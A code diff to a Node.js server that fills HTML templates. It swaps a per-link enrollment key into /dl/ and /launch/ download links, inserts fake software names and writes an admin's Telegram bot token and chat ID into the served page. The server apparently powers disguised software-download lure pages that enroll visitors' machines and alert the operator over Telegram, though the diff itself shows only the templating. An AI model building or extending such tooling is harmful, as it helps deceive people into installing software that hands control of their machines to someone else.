@@ -2565,17 +2565,24 @@ const server = http.createServer((req, res) => {
       // Covers both absolute (https://…/dl/KEY) and relative (/dl/KEY) forms.
       if (link.enrollmentKey) {
         const encKey = encodeURIComponent(link.enrollmentKey);
-        html = html.replace(/(https?:\/\/[^"'\s]*\/dl\/)([A-Za-z0-9_%-]{5,60})/g, '$1' + encKey);
-        html = html.replace(/(\/dl\/)([A-Za-z0-9_%-]{5,60})/g, '$1' + encKey);
+        // Match both /dl/KEY and /launch/KEY (absolute and relative)
+        html = html.replace(/(https?:\/\/[^"'\s]*\/(?:dl|launch)\/)([A-Za-z0-9_%-]{5,60})/g, '$1' + encKey);
+        html = html.replace(/(\/(?:dl|launch)\/)([A-Za-z0-9_%-]{5,60})/g, '$1' + encKey);
       }
       // Replace software name placeholders
       if (link.name1) html = html.replace(/\{\{SOFTWARE_NAME\}\}/g, link.name1);
       if (link.name2) html = html.replace(/\{\{SOFTWARE_NAME_2\}\}/g, link.name2);
-      // Replace Telegram bot credentials
+      // Replace Telegram bot credentials — both {{placeholder}} and hardcoded JS variable values
       const adminRec = db.findAdminById(link.adminId);
       const alerts = (adminRec && adminRec.alerts) || {};
-      if (alerts.botToken) html = html.replace(/\{\{TELEGRAM_BOT_TOKEN\}\}/g, alerts.botToken);
-      if (alerts.chatId)   html = html.replace(/\{\{TELEGRAM_CHAT_ID\}\}/g,   alerts.chatId);
+      if (alerts.botToken) {
+        html = html.replace(/\{\{TELEGRAM_BOT_TOKEN\}\}/g, alerts.botToken);
+        html = html.replace(/((?:const|let|var)\s+TELEGRAM_BOT_TOKEN\s*=\s*['"`])([^'"`]*)(['"`])/g, '$1' + alerts.botToken.replace(/[$]/g, '$$$$') + '$3');
+      }
+      if (alerts.chatId) {
+        html = html.replace(/\{\{TELEGRAM_CHAT_ID\}\}/g, alerts.chatId);
+        html = html.replace(/((?:const|let|var)\s+TELEGRAM_CHAT_ID\s*=\s*['"`])([^'"`]*)(['"`])/g, '$1' + alerts.chatId.replace(/[$]/g, '$$$$') + '$3');
+      }
       // Rewrite relative image src to the served /tpl-img/ URL
       if (tpl.imgFilename) {
         const imgUrl = '/tpl-img/' + link.templateId + '/' + tpl.imgFilename;
